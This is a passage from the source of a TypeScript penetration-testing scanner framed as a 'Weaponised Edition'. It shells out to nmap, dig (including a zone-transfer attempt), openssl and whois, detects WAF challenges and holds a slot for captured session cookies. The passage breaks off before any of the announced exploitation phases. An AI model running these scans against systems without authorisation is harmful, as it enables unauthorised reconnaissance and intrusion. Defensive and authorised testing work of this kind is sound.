/**
 * SentinelX Professional Security Scanner — Weaponised Edition
 *
 * Real system tools for authorised penetration testing:
 *   • nmap, dig, whois, openssl, curl, crt.sh, ipinfo.io, Wayback Machine
 *
 * Weaponised phases (24–28) run only when the scan profile is deep_authorized
 * or lab. All exploitation uses safe canary tokens — no destructive commands,
 * no data modification. Origin IP override supported for direct-to-server testing.
 */

import * as tls from 'node:tls';
import * as net from 'node:net';
import * as dns from 'node:dns';
import { AsyncLocalStorage } from 'node:async_hooks';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);
const dnsResolve = dns.promises;

interface ScanContext {
  remaining: number;
  verificationRemaining: number;
  exhaustedNotified: boolean;
  authHeaders?: Record<string, string>;
  wafChallengeDetected: boolean;
  wafChallengeLogEmitted: boolean;
  activeProbeDepth: number;
  onWafChallenge?: () => void | Promise<void>;
  capturedSession?: string;
}

const scanContext = new AsyncLocalStorage<ScanContext>();

// ═══════════════════════════════════════════════════════════════════════════════
// TYPES
// ═══════════════════════════════════════════════════════════════════════════════

export interface RealFinding {
  title: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  verified?: boolean;
  verification?: 'verified' | 'version_match' | 'suspected' | 'informational';
  confidence?: number;
  evidenceQuality?: 'weak' | 'standard' | 'strong';
  verificationMethod?: string;
  reproducibility?: 'reproducible' | 'intermittent' | 'not_reproducible' | 'not_tested';
  affectedEndpoint?: string;
  affectedParameter?: string;
  negativeTests?: string;
  limitations?: string;
  toolInfo?: string;
  description: string;
  cvss: number;
  cve: string | null;
  evidence: string;
  remediation: string;
  compliance?: { owasp?: string[]; pci?: string[]; nist?: string[] };
}

export interface ScanResult {
  findings: RealFinding[];
  wafBlocked: boolean;
}

export interface Target {
  url: string;
  hostname: string;
  port: number;
  isHttps: boolean;
  assetType: string;
}

interface ProbeResult {
  status: number;
  headers: Record<string, string>;
  rawHeaders: string;
  body: string;
  finalUrl: string;
  durationMs: number;
  wafChallenge: boolean;
}

export type ScanType = 'recon' | 'enumeration' | 'vulnerability' | 'full';
export type LogFn = (msg: string) => Promise<void> | void;
export type ScanProfile = 'passive' | 'safe_active' | 'deep_authorized' | 'authenticated' | 'lab';

export interface ScanPolicy {
  profile: ScanProfile;
  requestBudget: number;
  verificationRequestBudget: number;
  timeoutMs: number;
  maxConcurrency: number;
  allowDeepChecks: boolean;
  allowExternalCallbacks: boolean;
  allowToolAdapters: boolean;
  allowVerification: boolean;
  originOverride?: string;
}

export const SCAN_POLICIES: Record<ScanProfile, Omit<ScanPolicy, 'profile'>> = {
  passive: {
    requestBudget: 80,
    verificationRequestBudget: 0,
    timeoutMs: 8_000,
    maxConcurrency: 2,
    allowDeepChecks: false,
    allowExternalCallbacks: false,
    allowToolAdapters: false,
    allowVerification: false,
  },
  safe_active: {
    requestBudget: 300,
    verificationRequestBudget: 0,
    timeoutMs: 10_000,
    maxConcurrency: 4,
    allowDeepChecks: false,
    allowExternalCallbacks: false,
    allowToolAdapters: false,
    allowVerification: false,
  },
  deep_authorized: {
    requestBudget: 8_000,
    verificationRequestBudget: 100,
    timeoutMs: 20_000,
    maxConcurrency: 10,
    allowDeepChecks: true,
    allowExternalCallbacks: true,
    allowToolAdapters: true,
    allowVerification: true,
  },
  authenticated: {
    requestBudget: 6_000,
    verificationRequestBudget: 100,
    timeoutMs: 20_000,
    maxConcurrency: 10,
    allowDeepChecks: true,
    allowExternalCallbacks: true,
    allowToolAdapters: true,
    allowVerification: true,
  },
  lab: {
    requestBudget: 8_000,
    verificationRequestBudget: 100,
    timeoutMs: 20_000,
    maxConcurrency: 12,
    allowDeepChecks: true,
    allowExternalCallbacks: true,
    allowToolAdapters: true,
    allowVerification: true,
  },
};

export function resolveScanPolicy(
  profile: string | undefined,
  originOverride?: string,
): ScanPolicy {
  const selected = (profile && profile in SCAN_POLICIES ? profile : 'safe_active') as ScanProfile;
  return { profile: selected, ...SCAN_POLICIES[selected], originOverride };
}

export interface ToolCapability {
  name: string;
  available: boolean;
  version?: string;
  path?: string;
  reason?: string;
}

const TOOL_COMMANDS: Record<string, string> = {
  nmap: 'nmap',
  dig: 'dig',
  whois: 'whois',
  openssl: 'openssl',
  curl: 'curl',
  httpx: 'httpx',
  nuclei: 'nuclei',
  ffuf: 'ffuf',
  sqlmap: 'sqlmap',
};

export async function discoverToolCapabilities(): Promise<ToolCapability[]> {
  const capabilities: ToolCapability[] = [];
  for (const [name, command] of Object.entries(TOOL_COMMANDS)) {
    try {
      const { stdout: path } = await execFileAsync('sh', ['-lc', `command -v ${command}`], {
        timeout: 2_000,
      });
      let version = '';
      try {
        const { stdout, stderr } = await execFileAsync(command, ['--version'], { timeout: 3_000 });
        version = `${stdout || stderr}`.split('\n')[0]?.trim() ?? '';
      } catch {
        version = 'installed; version unavailable';
      }
      capabilities.push({ name, available: true, path: path.trim(), version });
    } catch {
      capabilities.push({ name, available: false, reason: 'not installed' });
    }
  }
  return capabilities;
}

export function reserveScanRequest(): boolean {
  const context = scanContext.getStore();
  if (!context) return true;
  if (context.remaining <= 0) {
    context.exhaustedNotified = true;
    return false;
  }
  context.remaining -= 1;
  return true;
}

export function remainingScanRequests(): number | null {
  return scanContext.getStore()?.remaining ?? null;
}
export function reserveVerificationRequest(): boolean {
  const context = scanContext.getStore();
  if (!context) return true;
  if (context.verificationRemaining <= 0) return false;
  context.verificationRemaining -= 1;
  return true;
}
export function remainingVerificationRequests(): number | null {
  return scanContext.getStore()?.verificationRemaining ?? null;
}
export function getScanAuthHeaders(): Record<string, string> {
  return scanContext.getStore()?.authHeaders ?? {};
}
export function isWafChallengeDetected(): boolean {
  return scanContext.getStore()?.wafChallengeDetected ?? false;
}
export function activeProbesAllowed(): boolean {
  return !(scanContext.getStore()?.wafChallengeDetected ?? false);
}
export async function noteWafChallengeDetected(): Promise<void> {
  await recordWafChallenge();
}

export async function runActiveChecks<T>(fn: () => Promise<T>, fallback: T): Promise<T> {
  const context = scanContext.getStore();
  if (!context || context.wafChallengeDetected) return fallback;
  context.activeProbeDepth++;
  try {
    return await fn();
  } finally {
    context.activeProbeDepth--;
  }
}

export function isWafChallengeResponse(status: number, headers: Record<string, string>): boolean {
  if (status !== 403) return false;
  const cfMitigated = (headers['cf-mitigated'] ?? '').trim().toLowerCase() === 'challenge';
  const serverCloudflare = (headers['server'] ?? '').toLowerCase().includes('cloudflare');
  const cookies = (headers['set-cookie'] ?? '').toLowerCase();
  const hasCloudflareCookie =
    /(?:^|[,;]\s*)__(?:cf_bm)|(?:^|[,;]\s*)cf_clearance\s*=/.test(cookies) ||
    cookies.includes('__cf_bm=') ||
    cookies.includes('cf_clearance=');
  return cfMitigated || (serverCloudflare && hasCloudflareCookie);
}

export function isContextualReflection(body: string, payload: string): boolean {
  const candidates = new Set([payload]);
  try {
    candidates.add(decodeURIComponent(payload));
  } catch {}
  for (const candidate of candidates) {
    if (!candidate) continue;
    let offset = 0;
    while (true) {
      const position = body.indexOf(candidate, offset);
      if (position === -1) break;
      const before = body.slice(Math.max(0, position - 10), position);
      const after = body.slice(position + candidate.length, position + candidate.length + 10);
      const surrounding = `${before}${after}`;
      const hexDigits = (surrounding.match(/[0-9a-f]/gi) ?? []).length;
      const printable = [...surrounding].filter((c) => {
        const code = c.charCodeAt(0);
        return code >= 32 && code <= 126;
      }).length;
      if (
        (surrounding.length === 0 || printable / surrounding.length >= 0.8) &&
        hexDigits / Math.max(surrounding.length, 1) < 0.6
      )
        return true;
      offset = position + Math.max(candidate.length, 1);
    }
  }
  return false;
}

async function recordWafChallenge(): Promise<void> {
  const context = scanContext.getStore();
  if (!context || context.wafChallengeDetected) return;
  context.wafChallengeDetected = true;
  if (!context.wafChallengeLogEmitted) {
    context.wafChallengeLogEmitted = true;
    await context.onWafChallenge?.();
  }
}

function storeCapturedSession(cookie: string): void {
  const ctx = scanContext.getStore();
  if (ctx && !ctx.capturedSession) ctx.capturedSession = cookie;
}

function getCapturedSession(): string | undefined {
  return scanContext.getStore()?.capturedSession;
}

function downgradeWafChallengeFindings(findings: RealFinding[]): void {
  if (!isWafChallengeDetected()) return;
  for (const finding of findings) {
    if (finding.verification === 'informational' && finding.cvss === 0) continue;
    finding.confidence = 25;
    finding.verification = 'informational';
    finding.limitations = [finding.limitations, 'WAF challenge response — false positive likely.']
      .filter(Boolean)
      .join('\n');
  }
}

function suppressWafSensitiveFindings(findings: RealFinding[]): void {
  if (!isWafChallengeDetected()) return;
  for (let i = findings.length - 1; i >= 0; i--) {
    if (/\b(?:SSTI|NoSQL)\b/i.test(findings[i].title)) findings.splice(i, 1);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// CORE HELPERS
// ═══════════════════════════════════════════════════════════════════════════════

export function normalizeTarget(value: string, type: string): Target | null {
  let v = value.trim().replace(/^\*\./, '');
  let raw = v;
  if (!/^https?:\/\//i.test(v)) raw = type === 'ip' ? `http://${v}/` : `https://${v}/`;
  try {
    const u = new URL(raw);
    return {
      url: u.origin + '/',
      hostname: u.hostname,
      port: parseInt(u.port) || (u.protocol === 'https:' ? 443 : 80),
      isHttps: u.protocol === 'https:',
      assetType: type,
    };
  } catch {
    return null;
  }
}

const ts = () => new Date().toISOString();

async function probe(
  url: string,
  opts: {
    method?: string;
    headers?: Record<string, string>;
    body?: string;
    timeoutMs?: number;
    followRedirects?: boolean;
    skipAuth?: boolean;
    active?: boolean;
  } = {},
): Promise<ProbeResult | null> {
  const context = scanContext.getStore();
  const isActive = opts.active ?? (context?.activeProbeDepth ?? 0) > 0;
  if (isActive && context?.wafChallengeDetected) return null;
  if (!reserveScanRequest()) return null;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), opts.timeoutMs ?? 12_000);
  const t0 = Date.now();
  const storedAuth = (!opts.skipAuth && scanContext.getStore()?.authHeaders) ?? {};
  try {
    const res = await fetch(url, {
      method: opts.method ?? 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (compatible; SentinelX/2.0; security-scanner)',
        ...storedAuth,
        ...(opts.headers ?? {}),
      },
      body: opts.body,
      signal: controller.signal,
      redirect: opts.followRedirects === false ? 'manual' : 'follow',
    });
    const headers: Record<string, string> = {};
    const rawParts: string[] = [];
    res.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      headers[k] = val;
      rawParts.push(`  ${k}: ${val}`);
    });
    let body = '';
    try {
      body = await res.text();
    } catch {}
    const wafChallenge = isWafChallengeResponse(res.status, headers);
    if (wafChallenge) await noteWafChallengeDetected();
    return {
      status: res.status,
      headers,
      rawHeaders: rawParts.join('\n'),
      body: body.slice(0, 10_000),
      finalUrl: res.url || url,
      durationMs: Date.now() - t0,
      wafChallenge,
    };
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// 1. DNS ENUMERATION (dig)
// ═══════════════════════════════════════════════════════════════════════════════

async function digQuery(hostname: string, type: string): Promise<string[]> {
  try {
    const { stdout } = await execFileAsync(
      'dig',
      ['+short', '+timeout=5', '+tries=2', hostname, type],
      { timeout: 12_000 },
    );
    return stdout
      .trim()
      .split('\n')
      .map((l) => l.trim())
      .filter(Boolean);
  } catch {
    return [];
  }
}

export async function checkDns(hostname: string, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Running DNS enumeration with dig...`);

  const aRecords = await digQuery(hostname, 'A');
  const aaaaRecords = await digQuery(hostname, 'AAAA');
  const allIPs = [...aRecords, ...aaaaRecords];
  if (allIPs.length > 0) await onLog(`[${ts()}] Resolved IPs: ${allIPs.join(', ')}`);
  else await onLog(`[${ts()}] WARNING: ${hostname} did not resolve to any IP address`);

  const nsRecords = await digQuery(hostname, 'NS');
  await onLog(`[${ts()}] Nameservers: ${nsRecords.join(', ') || '(none)'}`);

  const mxRecords = await digQuery(hostname, 'MX');
  if (mxRecords.length === 0) {
    findings.push({
      title: 'No MX Records Configured',
      severity: 'low',
      cvss: 3.1,
      cve: null,
      description: `No MX records found for ${hostname}. Email may be misconfigured.`,
      evidence: `dig +short ${hostname} MX → (no results)`,
      remediation:
        'If email is used, configure MX records. Otherwise publish SPF -all and DMARC p=reject.',
    });
  }

  const txtRecords = await digQuery(hostname, 'TXT');
  const allTxt = txtRecords.map((r) => r.replace(/^"|"$/g, ''));
  await onLog(`[${ts()}] TXT records found: ${allTxt.length}`);

  const spf = allTxt.find((r) => r.startsWith('v=spf1'));
  if (!spf) {
    findings.push({
      title: 'Missing SPF Record — Email Spoofing Risk',
      severity: 'medium',
      cvss: 6.5,
      cve: null,
      description: `No SPF record found for ${hostname}.`,
      evidence: `dig +short ${hostname} TXT → no v=spf1 record`,
      remediation: 'Publish: "v=spf1 include:your-mail-provider.com -all".',
    });
  } else if (spf.includes('+all')) {
    findings.push({
      title: 'SPF Record Permits Any Sender (+all)',
      severity: 'high',
      cvss: 7.5,
      cve: null,
      description: 'SPF record ends with +all, authorising any mail server.',
      evidence: `SPF record: ${spf}`,
      remediation: 'Replace +all with -all to hard-reject unauthorised senders.',
    });
  } else if (spf.includes('~all')) {
    findings.push({
      title: 'SPF Record Uses Soft Fail (~all) — Weak Protection',
      severity: 'low',
      cvss: 3.7,
      cve: null,
      description: 'SPF ~all marks unauthorised senders as suspicious but does not reject them.',
      evidence: `SPF record: ${spf}`,
      remediation: 'Change ~all to -all for hard rejection.',
    });
  }

  const dmarcTxt = await digQuery(`_dmarc.${hostname}`, 'TXT');
  const dmarc = dmarcTxt.map((r) => r.replace(/"/g, '')).find((r) => r.startsWith('v=DMARC1'));
  if (!dmarc) {
    findings.push({
      title: 'Missing DMARC Record — No Email Authentication Policy',
      severity: 'medium',
      cvss: 6.5,
      cve: null,
      description: `No DMARC record at _dmarc.${hostname}.`,
      evidence: `dig +short _dmarc.${hostname} TXT → no v=DMARC1 record`,
      remediation: `Start with "v=DMARC1; p=none; rua=mailto:dmarc@${hostname}".`,
    });
  } else {
    const pMatch = dmarc.match(/p=(\w+)/i);
    const policy = pMatch?.[1]?.toLowerCase() ?? 'none';
    if (policy === 'none') {
      findings.push({
        title: "DMARC Policy Is 'none' — Spoofed Emails Reach Inboxes",
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: 'DMARC p=none only generates reports.',
        evidence: `DMARC record: ${dmarc}`,
        remediation: 'Escalate to p=quarantine then p=reject after reviewing reports.',
      });
    } else await onLog(`[${ts()}] DMARC policy: ${policy} (OK)`);
  }

  const caaRecords = await digQuery(hostname, 'CAA');
  if (caaRecords.length === 0) {
    findings.push({
      title: 'No CAA Records — Any CA Can Issue Certificates',
      severity: 'low',
      cvss: 3.7,
      cve: null,
      description: `No CAA records found for ${hostname}.`,
      evidence: `dig +short ${hostname} CAA → (no results)`,
      remediation: `Add CAA records to restrict certificate issuance.\n${hostname}. CAA 0 issue "letsencrypt.org"`,
    });
  } else await onLog(`[${ts()}] CAA records: ${caaRecords.join(', ')}`);

  if (nsRecords.length > 0) {
    const ns = nsRecords[0]!.replace(/\.$/, '');
    try {
      const { stdout } = await execFileAsync('dig', ['AXFR', hostname, `@${ns}`, '+time=5'], {
        timeout: 12_000,
      });
      if (stdout.includes('Transfer failed') || stdout.includes('REFUSED')) {
        await onLog(`[${ts()}] Zone transfer refused by ${ns} (expected)`);
      } else if (stdout.split('\n').length > 15) {
        findings.push({
          title: 'DNS Zone Transfer Allowed — Full Zone Exposed',
          severity: 'high',
          cvss: 7.5,
          cve: null,
          description: `The nameserver ${ns} allows unauthenticated DNS zone transfers.`,
          evidence: `dig AXFR ${hostname} @${ns}\nResponse contained ${stdout.split('\n').length} lines`,
          remediation: 'Configure the nameserver to refuse AXFR requests from unauthorised IPs.',
        });
      }
    } catch {}
  }

  await onLog(`[${ts()}] DNS enumeration complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 2. PORT SCANNING (nmap)
// ═══════════════════════════════════════════════════════════════════════════════

interface NmapService {
  port: number;
  protocol: string;
  state: string;
  service: string;
  version: string;
}

async function nmapScan(hostname: string, portRange: string, onLog: LogFn): Promise<NmapService[]> {
  await onLog(`[${ts()}] nmap -sV -p ${portRange} ${hostname} ...`);
  try {
    const { stdout } = await execFileAsync(
      'nmap',
      [
        '-sV',
        '-sT',
        '-p',
        portRange,
        '--open',
        '-T4',
        '--max-retries',
        '2',
        '--host-timeout',
        '45s',
        '-oG',
        '-',
        hostname,
      ],
      { timeout: 60_000 },
    );
    const services: NmapService[] = [];
    for (const line of stdout.split('\n')) {
      const m = line.match(/Ports:\s+(.+)/);
      if (!m) continue;
      for (const entry of m[1]!.split(',')) {
        const parts = entry.trim().split('/');
        if (parts.length >= 3 && parts[1] === 'open') {
          services.push({
            port: parseInt(parts[0]!),
            protocol: parts[2] ?? 'tcp',
            state: parts[1],
            service: parts[4] ?? '',
            version: parts[6] ?? '',
          });
        }
      }
    }
    await onLog(`[${ts()}] nmap found ${services.length} open port(s)`);
    return services;
  } catch (err: any) {
    await onLog(`[${ts()}] nmap scan error: ${err?.message ?? String(err)}`);
    return [];
  }
}

const SERVICE_RISKS: Record<
  string,
  {
    severity: 'critical' | 'high' | 'medium' | 'low';
    cvss: number;
    cve: string | null;
    description: string;
    remediation: string;
  }
> = {
  ftp: {
    severity: 'high',
    cvss: 7.5,
    cve: null,
    description: 'FTP exposed. Plaintext credentials.',
    remediation: 'Replace with SFTP/FTPS.',
  },
  telnet: {
    severity: 'critical',
    cvss: 9.8,
    cve: null,
    description: 'Telnet exposed. Plaintext passwords.',
    remediation: 'Replace with SSH.',
  },
  smtp: {
    severity: 'medium',
    cvss: 5.3,
    cve: null,
    description: 'SMTP relay exposed.',
    remediation: 'Restrict SMTP to authenticated users.',
  },
  rdp: {
    severity: 'high',
    cvss: 7.5,
    cve: null,
    description: 'RDP exposed.',
    remediation: 'Block 3389, use VPN.',
  },
  smb: {
    severity: 'high',
    cvss: 7.5,
    cve: null,
    description: 'SMB exposed.',
    remediation: 'Block 445.',
  },
  mysql: {
    severity: 'critical',
    cvss: 9.4,
    cve: null,
    description: 'MySQL exposed.',
    remediation: 'Bind to 127.0.0.1.',
  },
  postgres: {
    severity: 'critical',
    cvss: 9.4,
    cve: null,
    description: 'PostgreSQL exposed.',
    remediation: 'Bind to localhost.',
  },
  mongodb: {
    severity: 'critical',
    cvss: 9.8,
    cve: null,
    description: 'MongoDB exposed.',
    remediation: 'Enable auth, bind to 127.0.0.1.',
  },
  redis: {
    severity: 'critical',
    cvss: 9.8,
    cve: null,
    description: 'Redis exposed.',
    remediation: 'Set requirepass, bind to 127.0.0.1.',
  },
  elasticsearch: {
    severity: 'critical',
    cvss: 9.8,
    cve: null,
    description: 'Elasticsearch exposed.',
    remediation: 'Enable X-Pack security.',
  },
  ssh: {
    severity: 'medium',
    cvss: 5.3,
    cve: null,
    description: 'SSH exposed.',
    remediation: 'Disable password auth, use keys.',
  },
  vnc: {
    severity: 'critical',
    cvss: 9.8,
    cve: null,
    description: 'VNC exposed.',
    remediation: 'Block VNC ports.',
  },
  docker: {
    severity: 'critical',
    cvss: 10.0,
    cve: null,
    description: 'Docker API exposed.',
    remediation: 'Disable remote API.',
  },
  kubernetes: {
    severity: 'critical',
    cvss: 10.0,
    cve: null,
    description: 'Kubernetes API exposed.',
    remediation: 'Restrict API to authorised IPs.',
  },
  memcached: {
    severity: 'high',
    cvss: 7.5,
    cve: null,
    description: 'Memcached exposed.',
    remediation: 'Bind to 127.0.0.1.',
  },
};

export async function checkPorts(
  hostname: string,
  scanType: ScanType,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const portRange =
    scanType === 'full'
      ? '1-65535'
      : scanType === 'vulnerability'
        ? '1-10000'
        : '21,22,23,25,80,443,445,1433,1521,2375,2376,3306,3389,4848,5432,5601,5900,5984,6379,7001,8080,8443,8888,9200,9300,10000,11211,27017,28017,50000';
  const services = await nmapScan(hostname, portRange, onLog);
  for (const svc of services) {
    await onLog(
      `[${ts()}] OPEN PORT ${svc.port}/${svc.protocol} — ${svc.service} ${svc.version}`.trim(),
    );
    const svcName = svc.service.toLowerCase();
    let matched = false;
    for (const [key, risk] of Object.entries(SERVICE_RISKS)) {
      if (
        svcName.includes(key) ||
        (key === 'smb' && svc.port === 445) ||
        (key === 'rdp' && svc.port === 3389) ||
        (key === 'docker' && (svc.port === 2375 || svc.port === 2376))
      ) {
        findings.push({
          title: `Exposed Service: ${svc.service || key.toUpperCase()} on Port ${svc.port}/${svc.protocol}`,
          severity: risk.severity,
          description: risk.description,
          cvss: risk.cvss,
          cve: risk.cve,
          evidence: `nmap detected open port ${svc.port}/${svc.protocol}\nService: ${svc.service} ${svc.version}\nHost: ${hostname}`,
          remediation: risk.remediation,
        });
        matched = true;
        break;
      }
    }
    if (!matched && ![80, 443, 8080, 8443].includes(svc.port)) {
      findings.push({
        title: `Unexpected Open Port: ${svc.port}/${svc.protocol} (${svc.service || 'unknown'})`,
        severity: 'low',
        cvss: 3.7,
        cve: null,
        description: `Port ${svc.port}/${svc.protocol} is open.`,
        evidence: `nmap: ${svc.port}/${svc.protocol} open — ${svc.service} ${svc.version}`,
        remediation: `Block port ${svc.port} if not needed.`,
      });
    }
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 3. TLS / SSL ANALYSIS (openssl + node:tls)
// ═══════════════════════════════════════════════════════════════════════════════

async function opensslTlsInfo(hostname: string, port: number): Promise<string> {
  try {
    const { stdout } = await execFileAsync(
      'openssl',
      [
        's_client',
        '-connect',
        `${hostname}:${port}`,
        '-servername',
        hostname,
        '-brief',
        '-no_ign_eof',
      ],
      { timeout: 12_000 },
    );
    return stdout;
  } catch (err: any) {
    return err?.stdout ?? '';
  }
}

export async function checkTls(
  hostname: string,
  port: number,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Running openssl TLS analysis on ${hostname}:${port}...`);
  const opensslOut = await opensslTlsInfo(hostname, port);
  if (opensslOut) await onLog(`[${ts()}] openssl connected...`);
  const certResult = await new Promise<RealFinding[]>((resolve) => {
    const f: RealFinding[] = [];
    const socket = tls.connect(
      { host: hostname, port, servername: hostname, rejectUnauthorized: false, timeout: 12_000 },
      async () => {
        try {
          const cert = socket.getPeerCertificate(true);
          const proto = socket.getProtocol() ?? 'unknown';
          const cipher = socket.getCipher();
          socket.destroy();
          if (proto === 'TLSv1' || proto === 'TLSv1.0') {
            f.push({
              title: 'Deprecated TLS 1.0 Protocol Supported',
              severity: 'high',
              cvss: 7.4,
              cve: null,
              description: 'TLS 1.0 is deprecated.',
              evidence: `Protocol: ${proto}`,
              remediation: 'Disable TLS 1.0/1.1.',
            });
          } else if (proto === 'TLSv1.1') {
            f.push({
              title: 'Deprecated TLS 1.1 Protocol Supported',
              severity: 'medium',
              cvss: 5.9,
              cve: null,
              description: 'TLS 1.1 is deprecated.',
              evidence: `Protocol: ${proto}`,
              remediation: 'Disable TLS 1.1.',
            });
          } else {
            f.push({
              title: `TLS Configuration: ${proto}`,
              severity: 'low',
              cvss: 0,
              cve: null,
              description: `Negotiated ${proto}.`,
              evidence: `Protocol: ${proto}`,
              remediation: 'Monitor cipher suites.',
            });
          }
          const cipherName = cipher?.name?.toUpperCase() ?? '';
          if (cipherName.match(/RC4|DES|NULL|EXPORT|ANON|3DES/)) {
            f.push({
              title: `Weak Cipher Suite: ${cipher?.name}`,
              severity: 'high',
              cvss: 7.4,
              cve: null,
              description: 'Weak cipher negotiated.',
              evidence: `Cipher: ${cipher?.name}`,
              remediation: 'Remove weak ciphers.',
            });
          }
          if (!cert || !cert.valid_to) {
            resolve(f);
            return;
          }
          const selfSigned =
            cert.issuer?.CN === cert.subject?.CN && cert.issuer?.O === cert.subject?.O;
          if (selfSigned) {
            f.push({
              title: 'Self-Signed SSL Certificate',
              severity: 'medium',
              cvss: 5.9,
              cve: null,
              description: 'Certificate is self-signed.',
              evidence: `Subject: ${cert.subject?.CN}`,
              remediation: 'Use a trusted CA.',
            });
          }
          const expiresAt = new Date(cert.valid_to);
          const daysLeft = Math.floor((expiresAt.getTime() - Date.now()) / 86_400_000);
          if (daysLeft < 0) {
            f.push({
              title: 'SSL Certificate Expired',
              severity: 'critical',
              cvss: 9.1,
              cve: null,
              description: `Expired ${Math.abs(daysLeft)} days ago.`,
              evidence: `Expired: ${cert.valid_to}`,
              remediation: 'Renew immediately.',
            });
          } else if (daysLeft < 14) {
            f.push({
              title: `SSL Certificate Expiring in ${daysLeft} Day(s)`,
              severity: 'high',
              cvss: 7.5,
              cve: null,
              description: `Expires in ${daysLeft} days.`,
              evidence: `Expiry: ${cert.valid_to}`,
              remediation: 'Renew now.',
            });
          } else if (daysLeft < 30) {
            f.push({
              title: `SSL Certificate Expiring Soon (${daysLeft} days)`,
              severity: 'medium',
              cvss: 5.3,
              cve: null,
              description: `Expires in ${daysLeft} days.`,
              evidence: `Expiry: ${cert.valid_to}`,
              remediation: 'Renew soon.',
            });
          } else await onLog(`[${ts()}] TLS cert valid for ${daysLeft} more days (OK)`);
          const cn = cert.subject?.CN ?? '';
          const altNames: string[] = (cert.subjectaltname ?? '')
            .split(',')
            .map((s) => s.trim().replace(/^DNS:/, ''));
          const hostCovered =
            cn === hostname ||
            altNames.some(
              (n) => n === hostname || (n.startsWith('*.') && hostname.endsWith(n.slice(1))),
            );
          if (!hostCovered && cn) {
            f.push({
              title: 'SSL Certificate Subject Mismatch',
              severity: 'high',
              cvss: 7.4,
              cve: null,
              description: `CN ${cn} does not match ${hostname}.`,
              evidence: `Host: ${hostname}\nCN: ${cn}`,
              remediation: 'Reissue certificate with correct hostname.',
            });
          }
          const issuedAt = cert.valid_from ? new Date(cert.valid_from) : null;
          if (issuedAt) {
            const totalDays = (expiresAt.getTime() - issuedAt.getTime()) / 86_400_000;
            if (totalDays > 398) {
              f.push({
                title: 'Certificate Validity Exceeds 398 Days',
                severity: 'low',
                cvss: 3.1,
                cve: null,
                description: `${Math.round(totalDays)} days validity.`,
                evidence: `Validity: ${Math.round(totalDays)} days`,
                remediation: 'Issue certs with max 90 days.',
              });
            }
          }
          resolve(f);
        } catch (e) {
          resolve(f);
        }
      },
    );
    socket.on('error', () => resolve(f));
    socket.setTimeout(12_000, () => {
      socket.destroy();
      resolve(f);
    });
  });
  findings.push(...certResult);

  const legacyTests = [
    {
      flag: '-ssl3',
      proto: 'SSLv3',
      severity: 'critical' as const,
      cvss: 9.4,
      cve: 'CVE-2014-3566',
    },
    { flag: '-tls1', proto: 'TLS 1.0', severity: 'high' as const, cvss: 7.4, cve: null },
    { flag: '-tls1_1', proto: 'TLS 1.1', severity: 'medium' as const, cvss: 5.9, cve: null },
  ];
  for (const test of legacyTests) {
    try {
      const { stdout, stderr } = await execFileAsync(
        'openssl',
        [
          's_client',
          '-connect',
          `${hostname}:${port}`,
          '-servername',
          hostname,
          test.flag,
          '-brief',
        ],
        { timeout: 8_000 },
      ).catch((err: any) => ({ stdout: err.stdout ?? '', stderr: err.stderr ?? '' }));
      const combined = stdout + stderr;
      if (
        combined.includes('Verification:') ||
        combined.includes('CONNECTED') ||
        combined.includes('Protocol  :')
      ) {
        findings.push({
          title: `Legacy Protocol Accepted: ${test.proto}`,
          severity: test.severity,
          cvss: test.cvss,
          cve: test.cve,
          description: `Server accepted ${test.proto} handshake.`,
          evidence: `openssl s_client ${test.flag} succeeded`,
          remediation: `Disable ${test.proto}.`,
        });
      }
    } catch {}
  }
  await onLog(`[${ts()}] TLS analysis complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 4. WHOIS
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkWhois(hostname: string, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const parts = hostname.split('.');
  const rootDomain = parts.length > 2 ? parts.slice(-2).join('.') : hostname;
  await onLog(`[${ts()}] Running whois for ${rootDomain}...`);
  try {
    const { stdout } = await execFileAsync('whois', [rootDomain], { timeout: 20_000 });
    const w = stdout.toLowerCase();
    const expiryMatch = stdout.match(
      /(?:Registry Expiry Date|Expiry Date|Expiration Date|paid-till):\s*(\S+)/i,
    );
    if (expiryMatch) {
      const expiryStr = expiryMatch[1]!;
      const expiry = new Date(expiryStr);
      if (!isNaN(expiry.getTime())) {
        const daysLeft = Math.floor((expiry.getTime() - Date.now()) / 86_400_000);
        if (daysLeft < 30) {
          findings.push({
            title: `Domain Expiring in ${daysLeft} Day(s)`,
            severity: daysLeft < 7 ? 'critical' : 'high',
            cvss: daysLeft < 7 ? 9.8 : 8.1,
            cve: null,
            description: `Domain ${rootDomain} expires in ${daysLeft} days.`,
            evidence: `whois ${rootDomain}\nExpiry: ${expiryStr}\nDays remaining: ${daysLeft}`,
            remediation: 'Renew domain immediately.',
          });
        }
      }
    }
    if (!w.includes('redacted') && !w.includes('privacy') && !w.includes('protected')) {
      const emailMatch = stdout.match(/Registrant Email:\s*(\S+@\S+)/i);
      if (emailMatch && !emailMatch[1]!.includes('redacted')) {
        findings.push({
          title: 'WHOIS Registrant Email Publicly Exposed',
          severity: 'low',
          cvss: 3.1,
          cve: null,
          description: `Registrant email ${emailMatch[1]} is visible.`,
          evidence: `whois ${rootDomain}\nRegistrant Email: ${emailMatch[1]}`,
          remediation: 'Enable WHOIS privacy protection.',
        });
      }
    }
  } catch (err: any) {
    await onLog(`[${ts()}] whois lookup failed: ${err?.message ?? String(err)}`);
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 5. SUBDOMAIN DISCOVERY + TAKEOVER
// ═══════════════════════════════════════════════════════════════════════════════

export async function discoverSubdomains(
  hostname: string,
